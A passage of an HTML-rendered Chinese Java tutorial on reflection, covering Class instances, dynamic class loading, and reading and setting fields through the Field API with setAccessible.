punctuation\">(</span><span class=\"token string\">\"java.lang.String\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n</code></pre></div><p>因为<code>Class</code>实例在JVM中是唯一的，所以，上述方法获取的<code>Class</code>实例是同一个实例。可以用<code>==</code>比较两个<code>Class</code>实例：</p>\n<div class=\"language-java\" data-ext=\"java\" data-title=\"java\"><pre class=\"language-java\"><code><span class=\"token class-name\">Class</span> cls1 <span class=\"token operator\">=</span> <span class=\"token class-name\">String</span><span class=\"token punctuation\">.</span><span class=\"token keyword\">class</span><span class=\"token punctuation\">;</span>\n\n<span class=\"token class-name\">String</span> s <span class=\"token operator\">=</span> <span class=\"token string\">\"Hello\"</span><span class=\"token punctuation\">;</span>\n<span class=\"token class-name\">Class</span> cls2 <span class=\"token operator\">=</span> s<span class=\"token punctuation\">.</span><span class=\"token function\">getClass</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n<span class=\"token keyword\">boolean</span> sameClass <span class=\"token operator\">=</span> cls1 <span class=\"token operator\">==</span> cls2<span class=\"token punctuation\">;</span> <span class=\"token comment\">// true</span>\n</code></pre></div><p>注意一下<code>Class</code>实例比较和<code>instanceof</code>的差别：</p>\n<div class=\"language-java\" data-ext=\"java\" data-title=\"java\"><pre class=\"language-java\"><code><span class=\"token class-name\">Integer</span> n <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">Integer</span><span class=\"token punctuation\">(</span><span class=\"token number\">123</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n<span class=\"token keyword\">boolean</span> b1 <span class=\"token operator\">=</span> n <span class=\"token keyword\">instanceof</span> <span class=\"token class-name\">Integer</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">// true，因为n是Integer类型</span>\n<span class=\"token keyword\">boolean</span> b2 <span class=\"token operator\">=</span> n <span class=\"token keyword\">instanceof</span> <span class=\"token class-name\">Number</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">// true，因为n是Number类型的子类</span>\n\n<span class=\"token keyword\">boolean</span> b3 <span class=\"token operator\">=</span> n<span class=\"token punctuation\">.</span><span class=\"token function\">getClass</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">==</span> <span class=\"token class-name\">Integer</span><span class=\"token punctuation\">.</span><span class=\"token keyword\">class</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">// true，因为n.getClass()返回Integer.class</span>\n<span class=\"token keyword\">boolean</span> b4 <span class=\"token operator\">=</span> n<span class=\"token punctuation\">.</span><span class=\"token function\">getClass</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">==</span> <span class=\"token class-name\">Number</span><span class=\"token punctuation\">.</span><span class=\"token keyword\">class</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">// false，因为Integer.class!=Number.class</span>\n</code></pre></div><p>用<code>instanceof</code>不但匹配指定类型，还匹配指定类型的子类。而用<code>==</code>判断<code>class</code>实例可以精确地判断数据类型，但不能作子类型比较。</p>\n<p>通常情况下，我们应该用<code>instanceof</code>判断数据类型，因为面向抽象编程的时候，我们不关心具体的子类型。只有在需要精确判断一个类型是不是某个<code>class</code>的时候，我们才使用<code>==</code>判断<code>class</code>实例。</p>\n<p>因为反射的目的是为了获得某个实例的信息。因此，当我们拿到某个<code>Object</code>实例时，我们可以通过反射获取该<code>Object</code>的<code>class</code>信息：</p>\n<div class=\"language-java\" data-ext=\"java\" data-title=\"java\"><pre class=\"language-java\"><code><span class=\"token keyword\">void</span> <span class=\"token function\">printObjectInfo</span><span class=\"token punctuation\">(</span><span class=\"token class-name\">Object</span> obj<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n    <span class=\"token class-name\">Class</span> cls <span class=\"token operator\">=</span> obj<span class=\"token punctuation\">.</span><span class=\"token function\">getClass</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">}</span>\n</code></pre></div><p>要从<code>Class</code>实例获取获取的基本信息，参考下面的代码：</p>\n<div class=\"language-java\" data-ext=\"java\" data-title=\"java\"><pre class=\"language-java\"><code><span class=\"token comment\">// reflection</span>\n<span class=\"token keyword\">public</span> <span class=\"token keyword\">class</span> <span class=\"token class-name\">Main</span> <span class=\"token punctuation\">{</span>\n    <span class=\"token keyword\">public</span> <span class=\"token keyword\">static</span> <span class=\"token keyword\">void</span> <span class=\"token function\">main</span><span class=\"token punctuation\">(</span><span class=\"token class-name\">String</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span> args<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n        <span class=\"token function\">printClassInfo</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"\"</span><span class=\"token punctuation\">.</span><span class=\"token function\">getClass</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token function\">printClassInfo</span><span class=\"token punctuation\">(</span><span class=\"token class-name\">Runnable</span><span class=\"token punctuation\">.</span><span class=\"token keyword\">class</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token function\">printClassInfo</span><span class=\"token punctuation\">(</span><span class=\"token class-name\"><span class=\"token namespace\">java<span class=\"token punctuation\">.</span>time<span class=\"token punctuation\">.</span></span>Month</span><span class=\"token punctuation\">.</span><span class=\"token keyword\">class</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token function\">printClassInfo</span><span class=\"token punctuation\">(</span><span class=\"token class-name\">String</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">.</span><span class=\"token keyword\">class</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token function\">printClassInfo</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">int</span><span class=\"token punctuation\">.</span><span class=\"token keyword\">class</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">}</span>\n\n    <span class=\"token keyword\">static</span> <span class=\"token keyword\">void</span> <span class=\"token function\">printClassInfo</span><span class=\"token punctuation\">(</span><span class=\"token class-name\">Class</span> cls<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n        <span class=\"token class-name\">System</span><span class=\"token punctuation\">.</span>out<span class=\"token punctuation\">.</span><span class=\"token function\">println</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"Class name: \"</span> <span class=\"token operator\">+</span> cls<span class=\"token punctuation\">.</span><span class=\"token function\">getName</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token class-name\">System</span><span class=\"token punctuation\">.</span>out<span class=\"token punctuation\">.</span><span class=\"token function\">println</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"Simple name: \"</span> <span class=\"token operator\">+</span> cls<span class=\"token punctuation\">.</span><span class=\"token function\">getSimpleName</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>cls<span class=\"token punctuation\">.</span><span class=\"token function\">getPackage</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">!=</span> <span class=\"token keyword\">null</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n            <span class=\"token class-name\">System</span><span class=\"token punctuation\">.</span>out<span class=\"token punctuation\">.</span><span class=\"token function\">println</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"Package name: \"</span> <span class=\"token operator\">+</span> cls<span class=\"token punctuation\">.</span><span class=\"token function\">getPackage</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function\">getName</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token punctuation\">}</span>\n        <span class=\"token class-name\">System</span><span class=\"token punctuation\">.</span>out<span class=\"token punctuation\">.</span><span class=\"token function\">println</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"is interface: \"</span> <span class=\"token operator\">+</span> cls<span class=\"token punctuation\">.</span><span class=\"token function\">isInterface</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token class-name\">System</span><span class=\"token punctuation\">.</span>out<span class=\"token punctuation\">.</span><span class=\"token function\">println</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"is enum: \"</span> <span class=\"token operator\">+</span> cls<span class=\"token punctuation\">.</span><span class=\"token function\">isEnum</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token class-name\">System</span><span class=\"token punctuation\">.</span>out<span class=\"token punctuation\">.</span><span class=\"token function\">println</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"is array: \"</span> <span class=\"token operator\">+</span> cls<span class=\"token punctuation\">.</span><span class=\"token function\">isArray</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token class-name\">System</span><span class=\"token punctuation\">.</span>out<span class=\"token punctuation\">.</span><span class=\"token function\">println</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"is primitive: \"</span> <span class=\"token operator\">+</span> cls<span class=\"token punctuation\">.</span><span class=\"token function\">isPrimitive</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">}</span>\n<span class=\"token punctuation\">}</span>\n</code></pre></div><p>注意到数组（例如<code>String[]</code>）也是一种类，而且不同于<code>String.class</code>，它的类名是<code>[Ljava.lang.String;</code>。此外，JVM为每一种基本类型如<code>int</code>也创建了<code>Class</code>实例，通过<code>int.class</code>访问。</p>\n<p>如果获取到了一个<code>Class</code>实例，我们就可以通过该<code>Class</code>实例来创建对应类型的实例：</p>\n<div class=\"language-java\" data-ext=\"java\" data-title=\"java\"><pre class=\"language-java\"><code><span class=\"token comment\">// 获取String的Class实例:</span>\n<span class=\"token class-name\">Class</span> cls <span class=\"token operator\">=</span> <span class=\"token class-name\">String</span><span class=\"token punctuation\">.</span><span class=\"token keyword\">class</span><span class=\"token punctuation\">;</span>\n<span class=\"token comment\">// 创建一个String实例:</span>\n<span class=\"token class-name\">String</span> s <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span><span class=\"token class-name\">String</span><span class=\"token punctuation\">)</span> cls<span class=\"token punctuation\">.</span><span class=\"token function\">newInstance</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n</code></pre></div><p>上述代码相当于<code>new String()</code>。通过<code>Class.newInstance()</code>可以创建类实例，它的局限是：只能调用<code>public</code>的无参数构造方法。带参数的构造方法，或者非<code>public</code>的构造方法都无法通过<code>Class.newInstance()</code>被调用。</p>\n<h3>动态加载</h3>\n<p>JVM在执行Java程序的时候，并不是一次性把所有用到的class全部加载到内存，而是第一次需要用到class时才加载。例如：</p>\n<div class=\"language-java\" data-ext=\"java\" data-title=\"java\"><pre class=\"language-java\"><code><span class=\"token comment\">// Main.java</span>\n<span class=\"token keyword\">public</span> <span class=\"token keyword\">class</span> <span class=\"token class-name\">Main</span> <span class=\"token punctuation\">{</span>\n    <span class=\"token keyword\">public</span> <span class=\"token keyword\">static</span> <span class=\"token keyword\">void</span> <span class=\"token function\">main</span><span class=\"token punctuation\">(</span><span class=\"token class-name\">String</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span> args<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n        <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>args<span class=\"token punctuation\">.</span>length <span class=\"token operator\">&gt;</span> <span class=\"token number\">0</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n            <span class=\"token function\">create</span><span class=\"token punctuation\">(</span>args<span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token punctuation\">}</span>\n    <span class=\"token punctuation\">}</span>\n\n    <span class=\"token keyword\">static</span> <span class=\"token keyword\">void</span> <span class=\"token function\">create</span><span class=\"token punctuation\">(</span><span class=\"token class-name\">String</span> name<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n        <span class=\"token class-name\">Person</span> p <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">Person</span><span class=\"token punctuation\">(</span>name<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">}</span>\n<span class=\"token punctuation\">}</span>\n</code></pre></div><p>当执行<code>Main.java</code>时，由于用到了<code>Main</code>，因此，JVM首先会把<code>Main.class</code>加载到内存。然而，并不会加载<code>Person.class</code>，除非程序执行到<code>create()</code>方法，JVM发现需要加载<code>Person</code>类时，才会首次加载<code>Person.class</code>。如果没有执行<code>create()</code>方法，那么<code>Person.class</code>根本就不会被加载。</p>\n<p>这就是JVM动态加载<code>class</code>的特性。</p>\n<p>动态加载<code>class</code>的特性对于Java程序非常重要。利用JVM动态加载<code>class</code>的特性，我们才能在运行期根据条件加载不同的实现类。例如，Commons Logging总是优先使用Log4j，只有当Log4j不存在时，才使用JDK的logging。利用JVM动态加载特性，大致的实现代码如下：</p>\n<div class=\"language-java\" data-ext=\"java\" data-title=\"java\"><pre class=\"language-java\"><code><span class=\"token comment\">// Commons Logging优先使用Log4j:</span>\n<span class=\"token class-name\">LogFactory</span> factory <span class=\"token operator\">=</span> <span class=\"token keyword\">null</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token function\">isClassPresent</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"org.apache.logging.log4j.Logger\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n    factory <span class=\"token operator\">=</span> <span class=\"token function\">createLog4j</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">}</span> <span class=\"token keyword\">else</span> <span class=\"token punctuation\">{</span>\n    factory <span class=\"token operator\">=</span> <span class=\"token function\">createJdkLog</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">}</span>\n\n<span class=\"token keyword\">boolean</span> <span class=\"token function\">isClassPresent</span><span class=\"token punctuation\">(</span><span class=\"token class-name\">String</span> name<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n    <span class=\"token keyword\">try</span> <span class=\"token punctuation\">{</span>\n        <span class=\"token class-name\">Class</span><span class=\"token punctuation\">.</span><span class=\"token function\">forName</span><span class=\"token punctuation\">(</span>name<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token keyword\">return</span> <span class=\"token boolean\">true</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">}</span> <span class=\"token keyword\">catch</span> <span class=\"token punctuation\">(</span><span class=\"token class-name\">Exception</span> e<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n        <span class=\"token keyword\">return</span> <span class=\"token boolean\">false</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">}</span>\n<span class=\"token punctuation\">}</span>\n</code></pre></div><p>这就是为什么我们只需要把Log4j的jar包放到classpath中，Commons Logging就会自动使用Log4j的原因。</p>\n<h2>访问字段</h2>\n<p>对任意的一个<code>Object</code>实例，只要我们获取了它的<code>Class</code>，就可以获取它的一切信息。</p>\n<p>我们先看看如何通过<code>Class</code>实例获取字段信息。<code>Class</code>类提供了以下几个方法来获取字段：</p>\n<ul>\n<li>Field getField(name)：根据字段名获取某个public的field（包括父类）</li>\n<li>Field getDeclaredField(name)：根据字段名获取当前类的某个field（不包括父类）</li>\n<li>Field[] getFields()：获取所有public的field（包括父类）</li>\n<li>Field[] getDeclaredFields()：获取当前类的所有field（不包括父类）</li>\n</ul>\n<div class=\"language-java\" data-ext=\"java\" data-title=\"java\"><pre class=\"language-java\"><code><span class=\"token comment\">// reflection</span>\n<span class=\"token keyword\">public</span> <span class=\"token keyword\">class</span> <span class=\"token class-name\">Main</span> <span class=\"token punctuation\">{</span>\n    <span class=\"token keyword\">public</span> <span class=\"token keyword\">static</span> <span class=\"token keyword\">void</span> <span class=\"token function\">main</span><span class=\"token punctuation\">(</span><span class=\"token class-name\">String</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span> args<span class=\"token punctuation\">)</span> <span class=\"token keyword\">throws</span> <span class=\"token class-name\">Exception</span> <span class=\"token punctuation\">{</span>\n        <span class=\"token class-name\">Class</span> stdClass <span class=\"token operator\">=</span> <span class=\"token class-name\">Student</span><span class=\"token punctuation\">.</span><span class=\"token keyword\">class</span><span class=\"token punctuation\">;</span>\n        <span class=\"token comment\">// 获取public字段\"score\":</span>\n        <span class=\"token class-name\">System</span><span class=\"token punctuation\">.</span>out<span class=\"token punctuation\">.</span><span class=\"token function\">println</span><span class=\"token punctuation\">(</span>stdClass<span class=\"token punctuation\">.</span><span class=\"token function\">getField</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"score\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token comment\">// 获取继承的public字段\"name\":</span>\n        <span class=\"token class-name\">System</span><span class=\"token punctuation\">.</span>out<span class=\"token punctuation\">.</span><span class=\"token function\">println</span><span class=\"token punctuation\">(</span>stdClass<span class=\"token punctuation\">.</span><span class=\"token function\">getField</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"name\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token comment\">// 获取private字段\"grade\":</span>\n        <span class=\"token class-name\">System</span><span class=\"token punctuation\">.</span>out<span class=\"token punctuation\">.</span><span class=\"token function\">println</span><span class=\"token punctuation\">(</span>stdClass<span class=\"token punctuation\">.</span><span class=\"token function\">getDeclaredField</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"grade\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">}</span>\n<span class=\"token punctuation\">}</span>\n\n<span class=\"token keyword\">class</span> <span class=\"token class-name\">Student</span> <span class=\"token keyword\">extends</span> <span class=\"token class-name\">Person</span> <span class=\"token punctuation\">{</span>\n    <span class=\"token keyword\">public</span> <span class=\"token keyword\">int</span> score<span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">private</span> <span class=\"token keyword\">int</span> grade<span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">}</span>\n\n<span class=\"token keyword\">class</span> <span class=\"token class-name\">Person</span> <span class=\"token punctuation\">{</span>\n    <span class=\"token keyword\">public</span> <span class=\"token class-name\">String</span> name<span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">}</span>\n</code></pre></div><p>上述代码首先获取<code>Student</code>的<code>Class</code>实例，然后，分别获取<code>public</code>字段、继承的<code>public</code>字段以及<code>private</code>字段，打印出的<code>Field</code>类似：</p>\n<div class=\"language-plain\" data-ext=\"plain\" data-title=\"plain\"><pre class=\"language-plain\"><code>public int Student.score\npublic java.lang.String Person.name\nprivate int Student.grade\n</code></pre></div><p>一个<code>Field</code>对象包含了一个字段的所有信息：</p>\n<ul>\n<li><code>getName()</code>：返回字段名称，例如，<code>\"name\"</code>；</li>\n<li><code>getType()</code>：返回字段类型，也是一个<code>Class</code>实例，例如，<code>String.class</code>；</li>\n<li><code>getModifiers()</code>：返回字段的修饰符，它是一个<code>int</code>，不同的bit表示不同的含义。</li>\n</ul>\n<p>以<code>String</code>类的<code>value</code>字段为例，它的定义是：</p>\n<div class=\"language-java\" data-ext=\"java\" data-title=\"java\"><pre class=\"language-java\"><code><span class=\"token keyword\">public</span> <span class=\"token keyword\">final</span> <span class=\"token keyword\">class</span> <span class=\"token class-name\">String</span> <span class=\"token punctuation\">{</span>\n    <span class=\"token keyword\">private</span> <span class=\"token keyword\">final</span> <span class=\"token keyword\">byte</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span> value<span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">}</span>\n</code></pre></div><p>我们用反射获取该字段的信息，代码如下：</p>\n<div class=\"language-java\" data-ext=\"java\" data-title=\"java\"><pre class=\"language-java\"><code><span class=\"token class-name\">Field</span> f <span class=\"token operator\">=</span> <span class=\"token class-name\">String</span><span class=\"token punctuation\">.</span><span class=\"token keyword\">class</span><span class=\"token punctuation\">.</span><span class=\"token function\">getDeclaredField</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"value\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\nf<span class=\"token punctuation\">.</span><span class=\"token function\">getName</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">// \"value\"</span>\nf<span class=\"token punctuation\">.</span><span class=\"token function\">getType</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">// class [B 表示byte[]类型</span>\n<span class=\"token keyword\">int</span> m <span class=\"token operator\">=</span> f<span class=\"token punctuation\">.</span><span class=\"token function\">getModifiers</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token class-name\">Modifier</span><span class=\"token punctuation\">.</span><span class=\"token function\">isFinal</span><span class=\"token punctuation\">(</span>m<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">// true</span>\n<span class=\"token class-name\">Modifier</span><span class=\"token punctuation\">.</span><span class=\"token function\">isPublic</span><span class=\"token punctuation\">(</span>m<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">// false</span>\n<span class=\"token class-name\">Modifier</span><span class=\"token punctuation\">.</span><span class=\"token function\">isProtected</span><span class=\"token punctuation\">(</span>m<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">// false</span>\n<span class=\"token class-name\">Modifier</span><span class=\"token punctuation\">.</span><span class=\"token function\">isPrivate</span><span class=\"token punctuation\">(</span>m<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">// true</span>\n<span class=\"token class-name\">Modifier</span><span class=\"token punctuation\">.</span><span class=\"token function\">isStatic</span><span class=\"token punctuation\">(</span>m<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">// false</span>\n</code></pre></div><h3>获取字段值</h3>\n<p>利用反射拿到字段的一个<code>Field</code>实例只是第一步，我们还可以拿到一个实例对应的该字段的值。</p>\n<p>例如，对于一个<code>Person</code>实例，我们可以先拿到<code>name</code>字段对应的<code>Field</code>，再获取这个实例的<code>name</code>字段的值：</p>\n<div class=\"language-java\" data-ext=\"java\" data-title=\"java\"><pre class=\"language-java\"><code><span class=\"token comment\">// reflection</span>\n<span class=\"token keyword\">import</span> <span class=\"token import\"><span class=\"token namespace\">java<span class=\"token punctuation\">.</span>lang<span class=\"token punctuation\">.</span>reflect<span class=\"token punctuation\">.</span></span><span class=\"token class-name\">Field</span></span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">public</span> <span class=\"token keyword\">class</span> <span class=\"token class-name\">Main</span> <span class=\"token punctuation\">{</span>\n\n    <span class=\"token keyword\">public</span> <span class=\"token keyword\">static</span> <span class=\"token keyword\">void</span> <span class=\"token function\">main</span><span class=\"token punctuation\">(</span><span class=\"token class-name\">String</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span> args<span class=\"token punctuation\">)</span> <span class=\"token keyword\">throws</span> <span class=\"token class-name\">Exception</span> <span class=\"token punctuation\">{</span>\n        <span class=\"token class-name\">Object</span> p <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">Person</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"Xiao Ming\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token class-name\">Class</span> c <span class=\"token operator\">=</span> p<span class=\"token punctuation\">.</span><span class=\"token function\">getClass</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token class-name\">Field</span> f <span class=\"token operator\">=</span> c<span class=\"token punctuation\">.</span><span class=\"token function\">getDeclaredField</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"name\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token class-name\">Object</span> value <span class=\"token operator\">=</span> f<span class=\"token punctuation\">.</span><span class=\"token function\">get</span><span class=\"token punctuation\">(</span>p<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token class-name\">System</span><span class=\"token punctuation\">.</span>out<span class=\"token punctuation\">.</span><span class=\"token function\">println</span><span class=\"token punctuation\">(</span>value<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">// \"Xiao Ming\"</span>\n    <span class=\"token punctuation\">}</span>\n<span class=\"token punctuation\">}</span>\n\n<span class=\"token keyword\">class</span> <span class=\"token class-name\">Person</span> <span class=\"token punctuation\">{</span>\n    <span class=\"token keyword\">private</span> <span class=\"token class-name\">String</span> name<span class=\"token punctuation\">;</span>\n\n    <span class=\"token keyword\">public</span> <span class=\"token class-name\">Person</span><span class=\"token punctuation\">(</span><span class=\"token class-name\">String</span> name<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n        <span class=\"token keyword\">this</span><span class=\"token punctuation\">.</span>name <span class=\"token operator\">=</span> name<span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">}</span>\n<span class=\"token punctuation\">}</span>\n</code></pre></div><p>上述代码先获取<code>Class</code>实例，再获取<code>Field</code>实例，然后，用<code>Field.get(Object)</code>获取指定实例的指定字段的值。</p>\n<p>运行代码，如果不出意外，会得到一个<code>IllegalAccessException</code>，这是因为<code>name</code>被定义为一个<code>private</code>字段，正常情况下，<code>Main</code>类无法访问<code>Person</code>类的<code>private</code>字段。要修复错误，可以将<code>private</code>改为<code>public</code>，或者，在调用<code>Object value = f.get(p);</code>前，先写一句：</p>\n<div class=\"language-java\" data-ext=\"java\" data-title=\"java\"><pre class=\"language-java\"><code>f<span class=\"token punctuation\">.</span><span class=\"token function\">setAccessible</span><span class=\"token punctuation\">(</span><span class=\"token boolean\">true</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n</code></pre></div><p>调用<code>Field.setAccessible(true)</code>的意思是，别管这个字段是不是<code>public</code>，一律允许访问。</p>\n<p>可以试着加上上述语句，再运行代码，就可以打印出<code>private</code>字段的值。</p>\n<p>有童鞋会问：如果使用反射可以获取<code>private</code>字段的值，那么类的封装还有什么意义？</p>\n<p>答案是正常情况下，我们总是通过<code>p.name</code>来访问<code>Person</code>的<code>name</code>字段，编译器会根据<code>public</code>、<code>protected</code>和<code>private</code>决定是否允许访问字段，这样就达到了数据封装的目的。</p>\n<p>而反射是一种非常规的用法，使用反射，首先代码非常繁琐，其次，它更多地是给工具或者底层框架来使用，目的是在不知道目标实例任何信息的情况下，获取特定字段的值。</p>\n<p>此外，<code>setAccessible(true)</code>可能会失败。如果JVM运行期存在<code>SecurityManager</code>，那么它会根据规则进行检查，有可能阻止<code>setAccessible(true)</code>。例如，某个<code>SecurityManager</code>可能不允许对<code>java</code>和<code>javax</code>开头的<code>package</code>的类调用<code>setAccessible(true)</code>，这样可以保证JVM核心库的安全。</p>\n<h3>设置字段值</h3>\n<p>通过Field实例既然可以获取到指定实例的字段值，自然也可以设置字段的值。</p>\n<p>设置字段值是通过<code>Field.set(Object, Object)</code>实现的，其中第一个<code>Object</code>参数是指定的实例，第二个<code>Object</code>参数是待修改的值。示例代码如下：</p>\n<div class=\"language-java\" data-ext=\"java\" data-title=\"java\"><pre class=\"language-java\"><code><span class=\"token comment\">// reflection</span>\n<span class=\"token keyword\">import</span> <span class=\"token import\"><span class=\"token namespace\">java<span class=\"token punctuation\">.</span>lang<span class=\"token punctuation\">.</span>reflect<span class=\"token punctuation\">.</span></span><span class=\"token class-name\">Field</span></span><span class=\"token punctuation\">;</span>\n\n<span class=\"token keyword\">public</span> <span class=\"token keyword\">class</span> <span class=\"token class-name\">Main</span> <span class=\"token punctuation\">{</span>\n\n    <span class=\"token keyword\">public</span> <span class=\"token keyword\">static</span> <span class=\"token keyword\">void</span> <span class=\"token function\">main</span><span class=\"token punctuation\">(</span><span class=\"token class-name\">String</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span> args<span class=\"token punctuation\">)</span> <span class=\"token keyword\">throws</span> <span class=\"token class-name\">Exception</span> <span class=\"token punctuation\">{</span>\n        <span class=\"token class-name\">Person</span> p <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">Person</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"Xiao Ming\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span 